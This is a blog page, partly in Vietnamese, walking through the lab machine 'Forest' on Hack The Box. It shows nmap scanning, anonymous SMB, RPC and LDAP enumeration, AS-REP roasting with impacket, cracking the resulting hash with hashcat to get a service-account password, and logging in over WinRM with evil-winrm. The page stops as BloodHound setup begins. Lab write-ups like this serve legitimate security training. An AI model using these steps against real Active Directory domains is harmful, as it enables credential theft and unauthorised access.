@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="dcduc">
+    
+    <title>
+        
+            Machine: Forest |
+        
+        dcduc&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom-1.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"dcduc's blog","author":"dcduc","avatar":"/images/avatar.jpg","logo":"/images/logo.jpg","favicon":"/images/logo.jpg"},"menu":{"home":"/                       || fa-solid fa-home","archives":"/archives           || fa-solid fa-box-archive","me":{"icon":"fa-solid fa-book","children":[{"about":"/about                 || fa-solid fa-user-graduate"},{"tools":"/tools                 || fa-solid fa-tools"}]}},"first_screen":{"enable":true,"background_img":"/images/rain.gif","background_img_dark":"/images/bg.gif","description":null,"hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom-1.css"],"js":[null]},"root":"","source_data":{},"version":"4.2.3"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               dcduc&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box has-sub-menu">
+                            <a class="menu-text-color border-box" href="javascript:void(0);">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-book"></i>
+                                
+                                ME
+                                
+                                    <i class="menu-text-color collapse-icon fa-solid fa-angle-down"></i>
+                                
+                            </a>
+                            
+                                <ul class="sub-menu-list border-box">
+                                    
+                                        
+                                        <li class="sub-menu-item border-box ">
+                                            <a class="menu-text-color border-box flex-start" href="/about">
+                                                
+                                                    <i class="menu-text-color sub-menu-icon fa-solid fa-user-graduate"></i>
+                                                
+                                                ABOUT
+                                            </a>
+                                        </li>
+                                    
+                                        
+                                        <li class="sub-menu-item border-box ">
+                                            <a class="menu-text-color border-box flex-start" href="/tools">
+                                                
+                                                    <i class="menu-text-color sub-menu-icon fa-solid fa-tools"></i>
+                                                
+                                                TOOLS
+                                            </a>
+                                        </li>
+                                    
+                                </ul>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box has-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="javascript:void(0);">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-book"></i>
+                                </span>
+                            
+                            ME
+                        </a>
+                        
+                            <i class="right-side collapse-icon fa-solid fa-angle-left"></i>
+                        
+                    </label>
+                    
+                        <ul class="drawer-sub-menu-list border-box">
+                            
+                                
+                                <li class="sub-menu-item border-box">
+                                    <a class="drawer-menu-text-color border-box flex-start" href="/about">
+                                        
+                                            <span class="sub-menu-icon-wrap border-box flex-center">
+                                                <i class="drawer-menu-text-color sub-menu-icon fa-solid fa-user-graduate"></i>
+                                            </span>
+                                        
+                                        ABOUT
+                                    </a>
+                                </li>
+                            
+                                
+                                <li class="sub-menu-item border-box">
+                                    <a class="drawer-menu-text-color border-box flex-start" href="/tools">
+                                        
+                                            <span class="sub-menu-icon-wrap border-box flex-center">
+                                                <i class="drawer-menu-text-color sub-menu-icon fa-solid fa-tools"></i>
+                                            </span>
+                                        
+                                        TOOLS
+                                    </a>
+                                </li>
+                            
+                        </ul>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Machine: Forest
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">dcduc</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-10-29 23:19:21</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Oct 29 2024 23:19:50 GMT+0700">2024-10-29 23:19:50</span>
+            </span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id="Machine-info"><a href="#Machine-info" class="headerlink" title="Machine info"></a>Machine info</h2><p><img   src="https://i.imgur.com/b9LaKcv.png" ></p>
+<h2 id="Get-started"><a href="#Get-started" class="headerlink" title="Get started"></a>Get started</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -T4 --min-rate 1000 -sC -sV -p- -oN nmap 10.10.10.161</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-24 08:53:35Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49671/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49679/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49684/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49984/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1m24s, deviation: 0s, median: -1m25s</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-24T08:54:35</span><br><span class="line">|_  start_date: 2024-07-24T06:51:07</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!note] &gt; <img   src="https://i.imgur.com/VNPNGHg.png" ></p>
+<ul>
+<li>Active Directory (AD) là directory service dành cho Windows network environments. Đó là một cấu trúc phân cấp (hierarchical structure), phân tán (distributed) cho phép quản lý tập trung các tài nguyên của tổ chức, bao gồm users, computers, groups, network devices, file shares, group policies, devices, and trusts.. AD cung cấp các chức năng xác thực và ủy quyền trong Windows domain enviroment.</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>[!note] &gt; <img   src="https://i.imgur.com/9hgO0GP.png" ></p>
+<ul>
+<li>Lưu ý khi <code>ping</code><ul>
+<li>Nếu <code>ttl=64</code> → Linux</li>
+<li>Nếu <code>ttl=128</code> → Windows</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>Machine này có vẻ là Windows Server đóng vai trò Domain Controller trong Active Directory với domain là <code>htb.local</code>. Trên máy chủ này chạy các service có thể kể đến như:</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://bkhost.vn/blog/giao-thuc-kerberos/" >Kerberos (88)<i class="fas fa-external-link-alt"></i></a> là network authentication protocol sử dụng chủ yếu trong môi trường Windows. Nó sử dụng tickets để xác thực an toàn cho users và services. ← Giao thức này có 1 loại tấn công khá phổ biến là <a class="link"   target="_blank" rel="noopener" href="https://sec.vnpt.vn/2023/01/ky-thuat-attacking-kerberos-as-rep-roasting/" >AS-REP Roasting<i class="fas fa-external-link-alt"></i></a> (Đọc trước bài này trước khi tiếp tục).</li>
+<li>RPC (135): Microsoft Remote Procedure Call (MSRPC) - giao thức giao tiếp giữa các phần mềm (hoặc process - tiến trình) mà một chương trình có thể yêu cầu một dịch vụ từ một chương trình khác nằm trong một máy tính&#x2F;máy chủ khác hay hiểu đơn giản là phương pháp gọi hàm từ một máy tính ở xa để lấy về kết quả.</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://vietnix.vn/ldap-la-gi/" >LDAP (389)<i class="fas fa-external-link-alt"></i></a>: Lightweight Directory Access Protocol - giao thức truy cập cơ sở dữ liệu phân tán, được sử dụng để quản lý và truy xuất thông tin trong mạng máy tính. Thường được sử dụng bởi Active Directory.</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://viettuans.vn/smb-la-gi" >SMB (445)<i class="fas fa-external-link-alt"></i></a>: Server Message Block - giao thức mạng dùng để chia sẻ tệp tin và thiết bị trong một mạng. Nó được sử dụng chủ yếu trong các hệ điều hành Windows để cho phép các máy tính khác nhau truy cập và chia sẻ tài nguyên như file, máy in và thư mục. ← Giao thức này từng có 1 CVE rất nổi tiếng là <a class="link"   target="_blank" rel="noopener" href="https://gist.github.com/05t3/7d5925e6a4585abe2a48cc4a978aea87" >Eternal Blue<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm" >WinRM (5985)<i class="fas fa-external-link-alt"></i></a>: <a class="link"   target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx" >Windows Remote Management<i class="fas fa-external-link-alt"></i></a> được đánh dấu là protocol bởi Microsoft cho phép quản lý từ xa các hệ thống Windows thông qua HTTP(S), tận dụng SOAP trong proccess. Về cơ bản, nó được cung cấp bởi WMI (Windows Management Instrumentation), được biểu diễn dưới dạng HTTP-based interface cho các WMI operation.</li>
+</ul>
+<p>Tiếp theo ta cần thử access vào các service này để xem có thể khai thác được thông tin gì từ các service này không.</p>
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><blockquote>
+<p>[!note]</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb" >SMB<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" >LDAP<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm" >WinRM<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" >RPC<i class="fas fa-external-link-alt"></i></a> <a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc" ><i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+</blockquote>
+<p>Follow theo instruction SMB trên Hacktricks ta có thể sử dụng công cụ <a class="link"   target="_blank" rel="noopener" href="https://github.com/CiscoCXSecurity/enum4linux" >enum4linux<i class="fas fa-external-link-alt"></i></a> để khai thác một số thông tin thông qua login ẩn danh. Tuy nhiên công cụ trên đã không được update từ khá lâu nên không khuyến khích sử dụng. Thay vào đó ta sẽ sử dụng <a class="link"   target="_blank" rel="noopener" href="https://github.com/cddmp/enum4linux-ng" >enum4linux-ng<i class="fas fa-external-link-alt"></i></a> (ng - next generation).</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./enum4linux -A 10.10.10.161</span><br></pre></td></tr></table></figure>
+
+<p>Ngoài SMB, thì tool này còn recon được các thông tin của các service khác bao gồm LDAP, NetBIOS, RPC.</p>
+<p><img   src="https://i.imgur.com/KpWT6nf.png" ></p>
+<p><img   src="https://i.imgur.com/MejpmA5.png" ></p>
+<p>Vậy thông qua việc scan trên ta thu thập được những thông tin sau:</p>
+<ul>
+<li>DNS domain: <code>htb.local</code></li>
+<li>FQDN (Fully qualified domain name - Tên miền đầy đủ): <code>FOREST.htb.local</code></li>
+<li>Máy chủ này là Root Domain Controller của domain này với domain name là <code>htb.local</code>.</li>
+</ul>
+<p>Ngoài ra ta còn thu thâp được danh sách user và group.<br><img   src="https://i.imgur.com/TpeAQwS.png" ><br>Những user có username bắt đầu bằng <code>HealthMailbox</code> và <code>SM_</code> ta có thể skip vì đây là các user liên quan đến Microsoft Exchange. <a class="link"   target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/exchange-team-blog/exchange-2013-2016-monitoring-mailboxes/ba-p/611004" >Exchange 2013&#x2F;2016 Monitoring Mailboxes - Microsoft Community Hub<i class="fas fa-external-link-alt"></i></a>.</p>
+<p>Tiếp theo ta cần scan thêm bằng các tool khác để tránh bỏ sót thông tin.</p>
+<h4 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h4><blockquote>
+<p>Source: <a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#enumerate-users-groups-and-logged-on-users" >139,445 - Pentesting SMB | HackTricks<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N 10.10.10.161</span><br><span class="line">enumdomusers</span><br><span class="line">enumdomgroups</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/QsyxhV1.png" ></p>
+<p>Thông qua việc đăng nhập ẩn danh, ta cũng thu thập được thông tin các user tương tự như <code>enum4linux-ng</code>.</p>
+<h4 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h4><blockquote>
+<p>Source: <a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap#bypass-tls-sni-check" >389, 636, 3268, 3269 - Pentesting LDAP | HackTricks<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://10.10.10.161 -x -s base -b <span class="string">&#x27;&#x27;</span> <span class="string">&quot;(objectClass=*)&quot;</span> <span class="string">&quot;*&quot;</span> +</span><br><span class="line">ldapsearch -x -b <span class="string">&quot;DC=htb,DC=local&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span> -H ldap://10.10.10.161 | grep -i samaccountname: | <span class="built_in">cut</span> -f 2 -d <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-H</code>: xác định URL của máy chủ LDAP muốn kết nối.</li>
+<li><code>-x</code>: sử dụng simple authentication (xác thực đơn giản) thay vì SASL (Simple Authentication and Security Layer).</li>
+<li><code>-s base</code>: chỉ định scope (phạm vi) của tìm kiếm. <code>base</code> có nghĩa là chỉ tìm kiếm ở cấp gốc (base level) của LDAP tree.</li>
+<li><code>-b</code>: chỉ định base DN (Distinguished Name) từ đó bắt đầu tìm kiếm. Ở đây, base DN là một chuỗi rỗng <code>&#39;&#39;</code>, có nghĩa là tìm kiếm từ gốc của LDAP tree.</li>
+<li><code>&quot;(objectClass=*)&quot;</code>: filter cho tìm kiếm. <code>(objectClass=*)</code> là tìm kiếm tất cả các mục có thuộc tính <code>objectClass</code>, tức là tất cả các mục trong LDAP tree.</li>
+<li><code>&quot;*&quot;</code>: lấy tất cả các thuộc tính của các mục khớp với bộ lọc tìm kiếm.</li>
+<li><code>+</code>: lấy tất cả các thuộc tính operational (thuộc tính hoạt động) của các mục khớp với bộ lọc tìm kiếm. Operational attributes là các thuộc tính được sử dụng nội bộ bởi máy chủ LDAP và không phải lúc nào cũng được hiển thị theo mặc định.</li>
+</ul>
+<p><img   src="https://i.imgur.com/ZuIMU4o.png" ></p>
+<p><img   src="https://i.imgur.com/RhV0dEt.png" ></p>
+<h4 id="Keberos"><a href="#Keberos" class="headerlink" title="Keberos"></a>Keberos</h4><p>Như đã đề cập thì Keberos có 1 bug khá nổi tiếng là <a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast" >ASREPRoast<i class="fas fa-external-link-alt"></i></a>. Chi tiết về Kerberos Authentication và AS-REP Roasting được phân tích ở bài viết <a class="link"   target="_blank" rel="noopener" href="https://sec.vnpt.vn/2023/01/ky-thuat-attacking-kerberos-as-rep-roasting/" >này<i class="fas fa-external-link-alt"></i></a>.</p>
+<p>Ở đây ta sẽ sử dụng 1 tool gắn liền với kĩ thuật này là script <code>GetNPUsers.py</code> của bộ <code>impacket-collection</code> python. Ở bài này vì default nếu không truyền <code>-usersfile</code> thì script trên sẽ sử dụng SPN (Service Principal Name) Scanning để tự động tìm các user. Khi này ta có thể sử dụng thêm <code>-request</code> để yêu cầu ticket-granting tickets (TGTs) cho các tài khoản không bật <code>DONT_REQ_PREAUTH</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Documents/Tools/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -format hashcat htb.local/ -request</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">python3 ~/Documents/Tools/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile user</span><br><span class="line">s.txt htb.local/</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/ThYcuiE.png" ></p>
+<p><img   src="https://i.imgur.com/nqEW0tk.png" ></p>
+<p>Tiếp theo sử dụng hashcat để crack password của user <code>svc-alfresco</code>, đây là service account của <code>alfresco</code>.</p>
+<h3 id="Crack-password"><a href="#Crack-password" class="headerlink" title="Crack password"></a>Crack password</h3><p>Đầu tiên ta cần tìm loại id type hashcat của password này.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe .\hash.txt <span class="comment"># autodetect mode</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/jznEI4x.png" ></p>
+<p>Ngoài ra có thể tìm thủ công thông qua</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe <span class="literal">--example-hashes</span> | findstr krb</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/zX2aP7S.png" ></p>
+<p>Tiến hành crack (Ngoài ra nếu ta truyền thẳng chuỗi hash và wordlist thì hashcat sẽ tự động detect và crack đồng thời)</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe <span class="literal">-m</span> <span class="number">18200</span> .\hash.txt C:\Users\dcduc\Documents\Tools\Wordlists\rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/mPGBfNL.png" ></p>
+<p>Tìm được password của user <code>svc-alfresco</code> là <code>s3rvice</code>.</p>
+<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><p>Khi đã có username và password, thì ta sẽ tận dụng service WinRM đã tìm được khi scan nmap. Ở đây ta sẽ sử dụng tool <code>evil-winrm</code> để thực hiện connect thông qua winrm trên linux.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 10.10.10.161 -u svc-alfresco -p <span class="string">&#x27;s3rvice&#x27;</span> -s <span class="string">&#x27;/ps1_scripts/&#x27;</span> -e <span class="string">&#x27;/exe_files/&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://i.imgur.com/KVLbKeJ.png" ></p>
+<h3 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h3><p><img   src="https://i.imgur.com/QDMWPxT.png" ></p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><blockquote>
+<p>Source: <a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" >Active Directory Methodology | HackTricks<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>Tiếp theo cần thêm thông tin về Active Directory này để thực hiện leo quyền. Tool ở đây sử dụng là <code>BloodHound</code>, ngoài ra có thêm xem thêm các tool khác ở link trên.</p>
+<blockquote>
+<p>[!note]<br>BloodHound là 1 single page Java app, được build trên Linkurious, được biên dịch bằng Electron và sử dụng neo4j làm database. BloodHound sử dụng graph theory để biểu diễn hidden và often unintended relationships của Active Directory. Thông qua BloodHound thì attacker có thể xác định được dễ dàng attack path đặc biệt trong các trường hợp phức tạp.</p>
+</blockquote>
+<p>Đầu tiên để khởi chạy BloodHound thì ta cần chạy neo4j để dùng làm database cho BloodHound.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> neo4j console</span><br></pre></td></tr></table></figure>
+
